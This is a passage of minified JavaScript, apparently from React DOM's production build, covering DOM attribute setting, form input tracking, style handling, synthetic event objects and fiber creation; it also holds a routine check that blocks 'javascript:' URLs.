e}return null}function Ua(e){var t=e.tag;if(t===5||t===26||t===27||t===6)return e.stateNode;throw Error(y(33))}function Kl(e){var t=e[Cs];return t||(t=e[Cs]={hoistableStyles:new Map,hoistableScripts:new Map}),t}function Ue(e){e[xa]=!0}var _s=new Set,Ds={};function _l(e,t){Jl(e,t),Jl(e+"Capture",t)}function Jl(e,t){for(Ds[e]=t,e=0;e<t.length;e++)_s.add(t[e])}var Zd=RegExp("^[:A-Z_a-z\\u00C0-\\u00D6\\u00D8-\\u00F6\\u00F8-\\u02FF\\u0370-\\u037D\\u037F-\\u1FFF\\u200C-\\u200D\\u2070-\\u218F\\u2C00-\\u2FEF\\u3001-\\uD7FF\\uF900-\\uFDCF\\uFDF0-\\uFFFD][:A-Z_a-z\\u00C0-\\u00D6\\u00D8-\\u00F6\\u00F8-\\u02FF\\u0370-\\u037D\\u037F-\\u1FFF\\u200C-\\u200D\\u2070-\\u218F\\u2C00-\\u2FEF\\u3001-\\uD7FF\\uF900-\\uFDCF\\uFDF0-\\uFFFD\\-.0-9\\u00B7\\u0300-\\u036F\\u203F-\\u2040]*$"),Hs={},Ns={};function Kd(e){return Ku.call(Ns,e)?!0:Ku.call(Hs,e)?!1:Zd.test(e)?Ns[e]=!0:(Hs[e]=!0,!1)}function Mn(e,t,l){if(Kd(t))if(l===null)e.removeAttribute(t);else{switch(typeof l){case"undefined":case"function":case"symbol":e.removeAttribute(t);return;case"boolean":var a=t.toLowerCase().slice(0,5);if(a!=="data-"&&a!=="aria-"){e.removeAttribute(t);return}}e.setAttribute(t,""+l)}}function xn(e,t,l){if(l===null)e.removeAttribute(t);else{switch(typeof l){case"undefined":case"function":case"symbol":case"boolean":e.removeAttribute(t);return}e.setAttribute(t,""+l)}}function wt(e,t,l,a){if(a===null)e.removeAttribute(l);else{switch(typeof a){case"undefined":case"function":case"symbol":case"boolean":e.removeAttribute(l);return}e.setAttributeNS(t,l,""+a)}}function dt(e){switch(typeof e){case"bigint":case"boolean":case"number":case"string":case"undefined":return e;case"object":return e;default:return""}}function Ms(e){var t=e.type;return(e=e.nodeName)&&e.toLowerCase()==="input"&&(t==="checkbox"||t==="radio")}function Jd(e,t,l){var a=Object.getOwnPropertyDescriptor(e.constructor.prototype,t);if(!e.hasOwnProperty(t)&&typeof a<"u"&&typeof a.get=="function"&&typeof a.set=="function"){var n=a.get,u=a.set;return Object.defineProperty(e,t,{configurable:!0,get:function(){return n.call(this)},set:function(i){l=""+i,u.call(this,i)}}),Object.defineProperty(e,t,{enumerable:a.enumerable}),{getValue:function(){return l},setValue:function(i){l=""+i},stopTracking:function(){e._valueTracker=null,delete e[t]}}}}function ti(e){if(!e._valueTracker){var t=Ms(e)?"checked":"value";e._valueTracker=Jd(e,t,""+e[t])}}function xs(e){if(!e)return!1;var t=e._valueTracker;if(!t)return!0;var l=t.getValue(),a="";return e&&(a=Ms(e)?e.checked?"true":"false":e.value),e=a,e!==l?(t.setValue(e),!0):!1}function Un(e){if(e=e||(typeof document<"u"?document:void 0),typeof e>"u")return null;try{return e.activeElement||e.body}catch{return e.body}}var Wd=/[\n"\\]/g;function ht(e){return e.replace(Wd,function(t){return"\\"+t.charCodeAt(0).toString(16)+" "})}function li(e,t,l,a,n,u,i,c){e.name="",i!=null&&typeof i!="function"&&typeof i!="symbol"&&typeof i!="boolean"?e.type=i:e.removeAttribute("type"),t!=null?i==="number"?(t===0&&e.value===""||e.value!=t)&&(e.value=""+dt(t)):e.value!==""+dt(t)&&(e.value=""+dt(t)):i!=="submit"&&i!=="reset"||e.removeAttribute("value"),t!=null?ai(e,i,dt(t)):l!=null?ai(e,i,dt(l)):a!=null&&e.removeAttribute("value"),n==null&&u!=null&&(e.defaultChecked=!!u),n!=null&&(e.checked=n&&typeof n!="function"&&typeof n!="symbol"),c!=null&&typeof c!="function"&&typeof c!="symbol"&&typeof c!="boolean"?e.name=""+dt(c):e.removeAttribute("name")}function Us(e,t,l,a,n,u,i,c){if(u!=null&&typeof u!="function"&&typeof u!="symbol"&&typeof u!="boolean"&&(e.type=u),t!=null||l!=null){if(!(u!=="submit"&&u!=="reset"||t!=null)){ti(e);return}l=l!=null?""+dt(l):"",t=t!=null?""+dt(t):l,c||t===e.value||(e.value=t),e.defaultValue=t}a=a??n,a=typeof a!="function"&&typeof a!="symbol"&&!!a,e.checked=c?e.checked:!!a,e.defaultChecked=!!a,i!=null&&typeof i!="function"&&typeof i!="symbol"&&typeof i!="boolean"&&(e.name=i),ti(e)}function ai(e,t,l){t==="number"&&Un(e.ownerDocument)===e||e.defaultValue===""+l||(e.defaultValue=""+l)}function Wl(e,t,l,a){if(e=e.options,t){t={};for(var n=0;n<l.length;n++)t["$"+l[n]]=!0;for(l=0;l<e.length;l++)n=t.hasOwnProperty("$"+e[l].value),e[l].selected!==n&&(e[l].selected=n),n&&a&&(e[l].defaultSelected=!0)}else{for(l=""+dt(l),t=null,n=0;n<e.length;n++){if(e[n].value===l){e[n].selected=!0,a&&(e[n].defaultSelected=!0);return}t!==null||e[n].disabled||(t=e[n])}t!==null&&(t.selected=!0)}}function Rs(e,t,l){if(t!=null&&(t=""+dt(t),t!==e.value&&(e.value=t),l==null)){e.defaultValue!==t&&(e.defaultValue=t);return}e.defaultValue=l!=null?""+dt(l):""}function ws(e,t,l,a){if(t==null){if(a!=null){if(l!=null)throw Error(y(92));if(Et(a)){if(1<a.length)throw Error(y(93));a=a[0]}l=a}l==null&&(l=""),t=l}l=dt(t),e.defaultValue=l,a=e.textContent,a===l&&a!==""&&a!==null&&(e.value=a),ti(e)}function Fl(e,t){if(t){var l=e.firstChild;if(l&&l===e.lastChild&&l.nodeType===3){l.nodeValue=t;return}}e.textContent=t}var Fd=new Set("animationIterationCount aspectRatio borderImageOutset borderImageSlice borderImageWidth boxFlex boxFlexGroup boxOrdinalGroup columnCount columns flex flexGrow flexPositive flexShrink flexNegative flexOrder gridArea gridRow gridRowEnd gridRowSpan gridRowStart gridColumn gridColumnEnd gridColumnSpan gridColumnStart fontWeight lineClamp lineHeight opacity order orphans scale tabSize widows zIndex zoom fillOpacity floodOpacity stopOpacity strokeDasharray strokeDashoffset strokeMiterlimit strokeOpacity strokeWidth MozAnimationIterationCount MozBoxFlex MozBoxFlexGroup MozLineClamp msAnimationIterationCount msFlex msZoom msFlexGrow msFlexNegative msFlexOrder msFlexPositive msFlexShrink msGridColumn msGridColumnSpan msGridRow msGridRowSpan WebkitAnimationIterationCount WebkitBoxFlex WebKitBoxFlexGroup WebkitBoxOrdinalGroup WebkitColumnCount WebkitColumns WebkitFlex WebkitFlexGrow WebkitFlexPositive WebkitFlexShrink WebkitLineClamp".split(" "));function js(e,t,l){var a=t.indexOf("--")===0;l==null||typeof l=="boolean"||l===""?a?e.setProperty(t,""):t==="float"?e.cssFloat="":e[t]="":a?e.setProperty(t,l):typeof l!="number"||l===0||Fd.has(t)?t==="float"?e.cssFloat=l:e[t]=(""+l).trim():e[t]=l+"px"}function Bs(e,t,l){if(t!=null&&typeof t!="object")throw Error(y(62));if(e=e.style,l!=null){for(var a in l)!l.hasOwnProperty(a)||t!=null&&t.hasOwnProperty(a)||(a.indexOf("--")===0?e.setProperty(a,""):a==="float"?e.cssFloat="":e[a]="");for(var n in t)a=t[n],t.hasOwnProperty(n)&&l[n]!==a&&js(e,n,a)}else for(var u in t)t.hasOwnProperty(u)&&js(e,u,t[u])}function ni(e){if(e.indexOf("-")===-1)return!1;switch(e){case"annotation-xml":case"color-profile":case"font-face":case"font-face-src":case"font-face-uri":case"font-face-format":case"font-face-name":case"missing-glyph":return!1;default:return!0}}var $d=new Map([["acceptCharset","accept-charset"],["htmlFor","for"],["httpEquiv","http-equiv"],["crossOrigin","crossorigin"],["accentHeight","accent-height"],["alignmentBaseline","alignment-baseline"],["arabicForm","arabic-form"],["baselineShift","baseline-shift"],["capHeight","cap-height"],["clipPath","clip-path"],["clipRule","clip-rule"],["colorInterpolation","color-interpolation"],["colorInterpolationFilters","color-interpolation-filters"],["colorProfile","color-profile"],["colorRendering","color-rendering"],["dominantBaseline","dominant-baseline"],["enableBackground","enable-background"],["fillOpacity","fill-opacity"],["fillRule","fill-rule"],["floodColor","flood-color"],["floodOpacity","flood-opacity"],["fontFamily","font-family"],["fontSize","font-size"],["fontSizeAdjust","font-size-adjust"],["fontStretch","font-stretch"],["fontStyle","font-style"],["fontVariant","font-variant"],["fontWeight","font-weight"],["glyphName","glyph-name"],["glyphOrientationHorizontal","glyph-orientation-horizontal"],["glyphOrientationVertical","glyph-orientation-vertical"],["horizAdvX","horiz-adv-x"],["horizOriginX","horiz-origin-x"],["imageRendering","image-rendering"],["letterSpacing","letter-spacing"],["lightingColor","lighting-color"],["markerEnd","marker-end"],["markerMid","marker-mid"],["markerStart","marker-start"],["overlinePosition","overline-position"],["overlineThickness","overline-thickness"],["paintOrder","paint-order"],["panose-1","panose-1"],["pointerEvents","pointer-events"],["renderingIntent","rendering-intent"],["shapeRendering","shape-rendering"],["stopColor","stop-color"],["stopOpacity","stop-opacity"],["strikethroughPosition","strikethrough-position"],["strikethroughThickness","strikethrough-thickness"],["strokeDasharray","stroke-dasharray"],["strokeDashoffset","stroke-dashoffset"],["strokeLinecap","stroke-linecap"],["strokeLinejoin","stroke-linejoin"],["strokeMiterlimit","stroke-miterlimit"],["strokeOpacity","stroke-opacity"],["strokeWidth","stroke-width"],["textAnchor","text-anchor"],["textDecoration","text-decoration"],["textRendering","text-rendering"],["transformOrigin","transform-origin"],["underlinePosition","underline-position"],["underlineThickness","underline-thickness"],["unicodeBidi","unicode-bidi"],["unicodeRange","unicode-range"],["unitsPerEm","units-per-em"],["vAlphabetic","v-alphabetic"],["vHanging","v-hanging"],["vIdeographic","v-ideographic"],["vMathematical","v-mathematical"],["vectorEffect","vector-effect"],["vertAdvY","vert-adv-y"],["vertOriginX","vert-origin-x"],["vertOriginY","vert-origin-y"],["wordSpacing","word-spacing"],["writingMode","writing-mode"],["xmlnsXlink","xmlns:xlink"],["xHeight","x-height"]]),Id=/^[\u0000-\u001F ]*j[\r\n\t]*a[\r\n\t]*v[\r\n\t]*a[\r\n\t]*s[\r\n\t]*c[\r\n\t]*r[\r\n\t]*i[\r\n\t]*p[\r\n\t]*t[\r\n\t]*:/i;function Rn(e){return Id.test(""+e)?"javascript:throw new Error('React has blocked a javascript: URL as a security precaution.')":e}function jt(){}var ui=null;function ii(e){return e=e.target||e.srcElement||window,e.correspondingUseElement&&(e=e.correspondingUseElement),e.nodeType===3?e.parentNode:e}var $l=null,Il=null;function Ys(e){var t=Zl(e);if(t&&(e=t.stateNode)){var l=e[Ke]||null;e:switch(e=t.stateNode,t.type){case"input":if(li(e,l.value,l.defaultValue,l.defaultValue,l.checked,l.defaultChecked,l.type,l.name),t=l.name,l.type==="radio"&&t!=null){for(l=e;l.parentNode;)l=l.parentNode;for(l=l.querySelectorAll('input[name="'+ht(""+t)+'"][type="radio"]'),t=0;t<l.length;t++){var a=l[t];if(a!==e&&a.form===e.form){var n=a[Ke]||null;if(!n)throw Error(y(90));li(a,n.value,n.defaultValue,n.defaultValue,n.checked,n.defaultChecked,n.type,n.name)}}for(t=0;t<l.length;t++)a=l[t],a.form===e.form&&xs(a)}break e;case"textarea":Rs(e,l.value,l.defaultValue);break e;case"select":t=l.value,t!=null&&Wl(e,!!l.multiple,t,!1)}}}var ci=!1;function qs(e,t,l){if(ci)return e(t,l);ci=!0;try{var a=e(t);return a}finally{if(ci=!1,($l!==null||Il!==null)&&(Tu(),$l&&(t=$l,e=Il,Il=$l=null,Ys(t),e)))for(t=0;t<e.length;t++)Ys(e[t])}}function Ra(e,t){var l=e.stateNode;if(l===null)return null;var a=l[Ke]||null;if(a===null)return null;l=a[t];e:switch(t){case"onClick":case"onClickCapture":case"onDoubleClick":case"onDoubleClickCapture":case"onMouseDown":case"onMouseDownCapture":case"onMouseMove":case"onMouseMoveCapture":case"onMouseUp":case"onMouseUpCapture":case"onMouseEnter":(a=!a.disabled)||(e=e.type,a=!(e==="button"||e==="input"||e==="select"||e==="textarea")),e=!a;break e;default:e=!1}if(e)return null;if(l&&typeof l!="function")throw Error(y(231,t,typeof l));return l}var Bt=!(typeof window>"u"||typeof window.document>"u"||typeof window.document.createElement>"u"),si=!1;if(Bt)try{var wa={};Object.defineProperty(wa,"passive",{get:function(){si=!0}}),window.addEventListener("test",wa,wa),window.removeEventListener("test",wa,wa)}catch{si=!1}var tl=null,fi=null,wn=null;function Ls(){if(wn)return wn;var e,t=fi,l=t.length,a,n="value"in tl?tl.value:tl.textContent,u=n.length;for(e=0;e<l&&t[e]===n[e];e++);var i=l-e;for(a=1;a<=i&&t[l-a]===n[u-a];a++);return wn=n.slice(e,1<a?1-a:void 0)}function jn(e){var t=e.keyCode;return"charCode"in e?(e=e.charCode,e===0&&t===13&&(e=13)):e=t,e===10&&(e=13),32<=e||e===13?e:0}function Bn(){return!0}function ks(){return!1}function Je(e){function t(l,a,n,u,i){this._reactName=l,this._targetInst=n,this.type=a,this.nativeEvent=u,this.target=i,this.currentTarget=null;for(var c in e)e.hasOwnProperty(c)&&(l=e[c],this[c]=l?l(u):u[c]);return this.isDefaultPrevented=(u.defaultPrevented!=null?u.defaultPrevented:u.returnValue===!1)?Bn:ks,this.isPropagationStopped=ks,this}return j(t.prototype,{preventDefault:function(){this.defaultPrevented=!0;var l=this.nativeEvent;l&&(l.preventDefault?l.preventDefault():typeof l.returnValue!="unknown"&&(l.returnValue=!1),this.isDefaultPrevented=Bn)},stopPropagation:function(){var l=this.nativeEvent;l&&(l.stopPropagation?l.stopPropagation():typeof l.cancelBubble!="unknown"&&(l.cancelBubble=!0),this.isPropagationStopped=Bn)},persist:function(){},isPersistent:Bn}),t}var Dl={eventPhase:0,bubbles:0,cancelable:0,timeStamp:function(e){return e.timeStamp||Date.now()},defaultPrevented:0,isTrusted:0},Yn=Je(Dl),ja=j({},Dl,{view:0,detail:0}),Pd=Je(ja),oi,ri,Ba,qn=j({},ja,{screenX:0,screenY:0,clientX:0,clientY:0,pageX:0,pageY:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,getModifierState:hi,button:0,buttons:0,relatedTarget:function(e){return e.relatedTarget===void 0?e.fromElement===e.srcElement?e.toElement:e.fromElement:e.relatedTarget},movementX:function(e){return"movementX"in e?e.movementX:(e!==Ba&&(Ba&&e.type==="mousemove"?(oi=e.screenX-Ba.screenX,ri=e.screenY-Ba.screenY):ri=oi=0,Ba=e),oi)},movementY:function(e){return"movementY"in e?e.movementY:ri}}),Gs=Je(qn),eh=j({},qn,{dataTransfer:0}),th=Je(eh),lh=j({},ja,{relatedTarget:0}),di=Je(lh),ah=j({},Dl,{animationName:0,elapsedTime:0,pseudoElement:0}),nh=Je(ah),uh=j({},Dl,{clipboardData:function(e){return"clipboardData"in e?e.clipboardData:window.clipboardData}}),ih=Je(uh),ch=j({},Dl,{data:0}),Xs=Je(ch),sh={Esc:"Escape",Spacebar:" ",Left:"ArrowLeft",Up:"ArrowUp",Right:"ArrowRight",Down:"ArrowDown",Del:"Delete",Win:"OS",Menu:"ContextMenu",Apps:"ContextMenu",Scroll:"ScrollLock",MozPrintableKey:"Unidentified"},fh={8:"Backspace",9:"Tab",12:"Clear",13:"Enter",16:"Shift",17:"Control",18:"Alt",19:"Pause",20:"CapsLock",27:"Escape",32:" ",33:"PageUp",34:"PageDown",35:"End",36:"Home",37:"ArrowLeft",38:"ArrowUp",39:"ArrowRight",40:"ArrowDown",45:"Insert",46:"Delete",112:"F1",113:"F2",114:"F3",115:"F4",116:"F5",117:"F6",118:"F7",119:"F8",120:"F9",121:"F10",122:"F11",123:"F12",144:"NumLock",145:"ScrollLock",224:"Meta"},oh={Alt:"altKey",Control:"ctrlKey",Meta:"metaKey",Shift:"shiftKey"};function rh(e){var t=this.nativeEvent;return t.getModifierState?t.getModifierState(e):(e=oh[e])?!!t[e]:!1}function hi(){return rh}var dh=j({},ja,{key:function(e){if(e.key){var t=sh[e.key]||e.key;if(t!=="Unidentified")return t}return e.type==="keypress"?(e=jn(e),e===13?"Enter":String.fromCharCode(e)):e.type==="keydown"||e.type==="keyup"?fh[e.keyCode]||"Unidentified":""},code:0,location:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,repeat:0,locale:0,getModifierState:hi,charCode:function(e){return e.type==="keypress"?jn(e):0},keyCode:function(e){return e.type==="keydown"||e.type==="keyup"?e.keyCode:0},which:function(e){return e.type==="keypress"?jn(e):e.type==="keydown"||e.type==="keyup"?e.keyCode:0}}),hh=Je(dh),yh=j({},qn,{pointerId:0,width:0,height:0,pressure:0,tangentialPressure:0,tiltX:0,tiltY:0,twist:0,pointerType:0,isPrimary:0}),Qs=Je(yh),mh=j({},ja,{touches:0,targetTouches:0,changedTouches:0,altKey:0,metaKey:0,ctrlKey:0,shiftKey:0,getModifierState:hi}),gh=Je(mh),vh=j({},Dl,{propertyName:0,elapsedTime:0,pseudoElement:0}),ph=Je(vh),Sh=j({},qn,{deltaX:function(e){return"deltaX"in e?e.deltaX:"wheelDeltaX"in e?-e.wheelDeltaX:0},deltaY:function(e){return"deltaY"in e?e.deltaY:"wheelDeltaY"in e?-e.wheelDeltaY:"wheelDelta"in e?-e.wheelDelta:0},deltaZ:0,deltaMode:0}),bh=Je(Sh),Th=j({},Dl,{newState:0,oldState:0}),Ah=Je(Th),Eh=[9,13,27,32],yi=Bt&&"CompositionEvent"in window,Ya=null;Bt&&"documentMode"in document&&(Ya=document.documentMode);var zh=Bt&&"TextEvent"in window&&!Ya,Vs=Bt&&(!yi||Ya&&8<Ya&&11>=Ya),Zs=" ",Ks=!1;function Js(e,t){switch(e){case"keyup":return Eh.indexOf(t.keyCode)!==-1;case"keydown":return t.keyCode!==229;case"keypress":case"mousedown":case"focusout":return!0;default:return!1}}function Ws(e){return e=e.detail,typeof e=="object"&&"data"in e?e.data:null}var Pl=!1;function Oh(e,t){switch(e){case"compositionend":return Ws(t);case"keypress":return t.which!==32?null:(Ks=!0,Zs);case"textInput":return e=t.data,e===Zs&&Ks?null:e;default:return null}}function Ch(e,t){if(Pl)return e==="compositionend"||!yi&&Js(e,t)?(e=Ls(),wn=fi=tl=null,Pl=!1,e):null;switch(e){case"paste":return null;case"keypress":if(!(t.ctrlKey||t.altKey||t.metaKey)||t.ctrlKey&&t.altKey){if(t.char&&1<t.char.length)return t.char;if(t.which)return String.fromCharCode(t.which)}return null;case"compositionend":return Vs&&t.locale!=="ko"?null:t.data;default:return null}}var _h={color:!0,date:!0,datetime:!0,"datetime-local":!0,email:!0,month:!0,number:!0,password:!0,range:!0,search:!0,tel:!0,text:!0,time:!0,url:!0,week:!0};function Fs(e){var t=e&&e.nodeName&&e.nodeName.toLowerCase();return t==="input"?!!_h[e.type]:t==="textarea"}function $s(e,t,l,a){$l?Il?Il.push(a):Il=[a]:$l=a,t=Du(t,"onChange"),0<t.length&&(l=new Yn("onChange","change",null,l,a),e.push({event:l,listeners:t}))}var qa=null,La=null;function Dh(e){wr(e,0)}function Ln(e){var t=Ua(e);if(xs(t))return e}function Is(e,t){if(e==="change")return t}var Ps=!1;if(Bt){var mi;if(Bt){var gi="oninput"in document;if(!gi){var ef=document.createElement("div");ef.setAttribute("oninput","return;"),gi=typeof ef.oninput=="function"}mi=gi}else mi=!1;Ps=mi&&(!document.documentMode||9<document.documentMode)}function tf(){qa&&(qa.detachEvent("onpropertychange",lf),La=qa=null)}function lf(e){if(e.propertyName==="value"&&Ln(La)){var t=[];$s(t,La,e,ii(e)),qs(Dh,t)}}function Hh(e,t,l){e==="focusin"?(tf(),qa=t,La=l,qa.attachEvent("onpropertychange",lf)):e==="focusout"&&tf()}function Nh(e){if(e==="selectionchange"||e==="keyup"||e==="keydown")return Ln(La)}function Mh(e,t){if(e==="click")return Ln(t)}function xh(e,t){if(e==="input"||e==="change")return Ln(t)}function Uh(e,t){return e===t&&(e!==0||1/e===1/t)||e!==e&&t!==t}var nt=typeof Object.is=="function"?Object.is:Uh;function ka(e,t){if(nt(e,t))return!0;if(typeof e!="object"||e===null||typeof t!="object"||t===null)return!1;var l=Object.keys(e),a=Object.keys(t);if(l.length!==a.length)return!1;for(a=0;a<l.length;a++){var n=l[a];if(!Ku.call(t,n)||!nt(e[n],t[n]))return!1}return!0}function af(e){for(;e&&e.firstChild;)e=e.firstChild;return e}function nf(e,t){var l=af(e);e=0;for(var a;l;){if(l.nodeType===3){if(a=e+l.textContent.length,e<=t&&a>=t)return{node:l,offset:t-e};e=a}e:{for(;l;){if(l.nextSibling){l=l.nextSibling;break e}l=l.parentNode}l=void 0}l=af(l)}}function uf(e,t){return e&&t?e===t?!0:e&&e.nodeType===3?!1:t&&t.nodeType===3?uf(e,t.parentNode):"contains"in e?e.contains(t):e.compareDocumentPosition?!!(e.compareDocumentPosition(t)&16):!1:!1}function cf(e){e=e!=null&&e.ownerDocument!=null&&e.ownerDocument.defaultView!=null?e.ownerDocument.defaultView:window;for(var t=Un(e.document);t instanceof e.HTMLIFrameElement;){try{var l=typeof t.contentWindow.location.href=="string"}catch{l=!1}if(l)e=t.contentWindow;else break;t=Un(e.document)}return t}function vi(e){var t=e&&e.nodeName&&e.nodeName.toLowerCase();return t&&(t==="input"&&(e.type==="text"||e.type==="search"||e.type==="tel"||e.type==="url"||e.type==="password")||t==="textarea"||e.contentEditable==="true")}var Rh=Bt&&"documentMode"in document&&11>=document.documentMode,ea=null,pi=null,Ga=null,Si=!1;function sf(e,t,l){var a=l.window===l?l.document:l.nodeType===9?l:l.ownerDocument;Si||ea==null||ea!==Un(a)||(a=ea,"selectionStart"in a&&vi(a)?a={start:a.selectionStart,end:a.selectionEnd}:(a=(a.ownerDocument&&a.ownerDocument.defaultView||window).getSelection(),a={anchorNode:a.anchorNode,anchorOffset:a.anchorOffset,focusNode:a.focusNode,focusOffset:a.focusOffset}),Ga&&ka(Ga,a)||(Ga=a,a=Du(pi,"onSelect"),0<a.length&&(t=new Yn("onSelect","select",null,t,l),e.push({event:t,listeners:a}),t.target=ea)))}function Hl(e,t){var l={};return l[e.toLowerCase()]=t.toLowerCase(),l["Webkit"+e]="webkit"+t,l["Moz"+e]="moz"+t,l}var ta={animationend:Hl("Animation","AnimationEnd"),animationiteration:Hl("Animation","AnimationIteration"),animationstart:Hl("Animation","AnimationStart"),transitionrun:Hl("Transition","TransitionRun"),transitionstart:Hl("Transition","TransitionStart"),transitioncancel:Hl("Transition","TransitionCancel"),transitionend:Hl("Transition","TransitionEnd")},bi={},ff={};Bt&&(ff=document.createElement("div").style,"AnimationEvent"in window||(delete ta.animationend.animation,delete ta.animationiteration.animation,delete ta.animationstart.animation),"TransitionEvent"in window||delete ta.transitionend.transition);function Nl(e){if(bi[e])return bi[e];if(!ta[e])return e;var t=ta[e],l;for(l in t)if(t.hasOwnProperty(l)&&l in ff)return bi[e]=t[l];return e}var of=Nl("animationend"),rf=Nl("animationiteration"),df=Nl("animationstart"),wh=Nl("transitionrun"),jh=Nl("transitionstart"),Bh=Nl("transitioncancel"),hf=Nl("transitionend"),yf=new Map,Ti="abort auxClick beforeToggle cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(" ");Ti.push("scrollEnd");function zt(e,t){yf.set(e,t),_l(t,[e])}var kn=typeof reportError=="function"?reportError:function(e){if(typeof window=="object"&&typeof window.ErrorEvent=="function"){var t=new window.ErrorEvent("error",{bubbles:!0,cancelable:!0,message:typeof e=="object"&&e!==null&&typeof e.message=="string"?String(e.message):String(e),error:e});if(!window.dispatchEvent(t))return}else if(typeof process=="object"&&typeof process.emit=="function"){process.emit("uncaughtException",e);return}console.error(e)},yt=[],la=0,Ai=0;function Gn(){for(var e=la,t=Ai=la=0;t<e;){var l=yt[t];yt[t++]=null;var a=yt[t];yt[t++]=null;var n=yt[t];yt[t++]=null;var u=yt[t];if(yt[t++]=null,a!==null&&n!==null){var i=a.pending;i===null?n.next=n:(n.next=i.next,i.next=n),a.pending=n}u!==0&&mf(l,n,u)}}function Xn(e,t,l,a){yt[la++]=e,yt[la++]=t,yt[la++]=l,yt[la++]=a,Ai|=a,e.lanes|=a,e=e.alternate,e!==null&&(e.lanes|=a)}function Ei(e,t,l,a){return Xn(e,t,l,a),Qn(e)}function Ml(e,t){return Xn(e,null,null,t),Qn(e)}function mf(e,t,l){e.lanes|=l;var a=e.alternate;a!==null&&(a.lanes|=l);for(var n=!1,u=e.return;u!==null;)u.childLanes|=l,a=u.alternate,a!==null&&(a.childLanes|=l),u.tag===22&&(e=u.stateNode,e===null||e._visibility&1||(n=!0)),e=u,u=u.return;return e.tag===3?(u=e.stateNode,n&&t!==null&&(n=31-at(l),e=u.hiddenUpdates,a=e[n],a===null?e[n]=[t]:a.push(t),t.lane=l|536870912),u):null}function Qn(e){if(50<rn)throw rn=0,xc=null,Error(y(185));for(var t=e.return;t!==null;)e=t,t=e.return;return e.tag===3?e.stateNode:null}var aa={};function Yh(e,t,l,a){this.tag=e,this.key=l,this.sibling=this.child=this.return=this.stateNode=this.type=this.elementType=null,this.index=0,this.refCleanup=this.ref=null,this.pendingProps=t,this.dependencies=this.memoizedState=this.updateQueue=this.memoizedProps=null,this.mode=a,this.subtreeFlags=this.flags=0,this.deletions=null,this.childLanes=this.lanes=0,this.alternate=null}function ut(e,t,l,a){return new Yh(e,t,l,a)}function zi(e){return e=e.prototype,!(!e||!e.isReactComponent)}function Yt(e,t){var l=e.alternate;return l===null?(l=ut(e.tag,t,e.key,e.mode),l.elementType=e.elementType,l.type=e.type,l.stateNode=e.stateNode,l.alternate=e,e.alternate=l):(l.pendingProps=t,l.type=e.type,l.flags=0,l.subtreeFlags=0,l.deletions=null),l.flags=e.flags&65011712,l.childLanes=e.childLanes,l.lanes=e.lanes,l.child=e.child,l.memoizedProps=e.memoizedProps,l.memoizedState=e.memoizedState,l.updateQueue=e.updateQueue,t=e.dependencies,l.dependencies=t===null?null:{lanes:t.lanes,firstContext:t.firstContext},l.sibling=e.sibling,l.index=e.index,l.ref=e.ref,l.refCleanup=e.refCleanup,l}function gf(e,t){e.flags&=65011714;var l=e.alternate;return l===null?(e.childLanes=0,e.lanes=t,e.child=null,e.subtreeFlags=0,e.memoizedProps=null,e.memoizedState=null,e.updateQueue=null,e.dependencies=null,e.stateNode=null):(e.childLanes=l.childLanes,e.lanes=l.lanes,e.child=l.child,e.subtreeFlags=0,e.deletions=null,e.memoizedProps=l.memoizedProps,e.memoizedState=l.memoizedState,e.updateQueue=l.updateQueue,e.type=l.type,t=l.dependencies,e.dependencies=t===null?null:{lanes:t.lanes,firstContext:t.firstContext}),e}function Vn(e,t,l,a,n,u){var i=0;if(a=e,typeof e=="function")zi(e)&&(i=1);else if(typeof e=="string")i=Xy(e,l,D.current)?26:e==="html"||e==="head"||e==="body"?27:5;else e:switch(e){case ge:return e=ut(31,l,t,n),e.elementType=ge,e.lanes=u,e;case H:return xl(l.children,n,u,t);case R:i=8,n|=24;break;case X:return e=ut(12,l,t,n|2),e.elementType=X,e.lanes=u,e;case et:return e=ut(13,l,t,n),e.elementType=et,e.lanes=u,e;case ae:return e=ut(19,l,t,n),e.elementType=ae,e.lanes=u,e;default:if(typeof e=="object"&&e!==null)switch(e.$$typeof){case Ee:i=10;break e;case x:i=9;break e;case we:i=11;break e;case Y:i=14;break e;case ze:i=16,a=null;break e}i=29,l=Error(y(130,e===null?"null":typeof e,"")),a=null}return t=ut(i,l,t,n),t.elementType=e,t.type=a,t.lanes=u,t}function xl(e,t,l,a){return e=ut(7,e,a,t),e.lanes=l,e}function Oi(e,t,l){return e=ut(6,e,null,t),e.lanes=l,e}function vf(e){var t=ut(18,null,null,0);return t.stateNode=e,t}function Ci(e,t,l){return t=ut(4,e.children!==null?e.children:[],e.key,t),t.lanes=l,t.stateNode={containerInfo:e.containerInfo,pendingChildren:null,implementation:e.implementation},t}var pf=new WeakMap;function mt(e,t){if(typeof e=="object"&&e!==null){var l=pf.get(e);return l!==void 0?l:(t={value:e,source:t,stack:gs(t)},pf.set(e,t),t)}return{value:e,source:t,stack:gs(t)}}var na=[],ua=0,Zn=null,Xa=0,gt=[],vt=0,ll=null,Nt=1,Mt="";function qt(e,t){na[ua++]=Xa,na[ua++]=Zn,Zn=e,Xa=t}function Sf(e,t,l){gt[vt++]=Nt,gt[vt++]=Mt,gt[vt++]=ll,ll=e;var a=Nt;e=Mt;var n=32-at(a)-1;a&=~(1<<n),l+=1;var u=32-at(t)+n;if(30<u){var i=n-n%5;u=(a&(1<<i)-1).toString(32),a>>=i,n-=i,Nt=1<<32-at(t)+n|l<<n|a,Mt=u+e}else Nt=1<<u|l<<n|a,Mt=e}function _i(e){e.return!==null&&(qt(e,1),Sf(e,1,0))}function Di(e){for(;e===Zn;)Zn=na[--ua],na[ua]=null,Xa=na[--ua],na[ua]=null;for(;e===ll;)ll=gt[--vt],gt[vt]=null,Mt=gt[--vt],gt[vt]=null,Nt=gt[--vt],gt[vt]=null}function bf(e,t){gt[vt++]=Nt,gt[vt++]=Mt,gt[vt++]=ll,Nt=t.id,Mt=t.overflow,ll=e}var Be=null,ve=null,ee=!1,al=null,pt=!1,Hi=Error(y(519));function nl(e){var t=Error(y(418,1<arguments.length&&arguments[1]!==void 0&&arguments[1]?"text":"HTML",""));throw 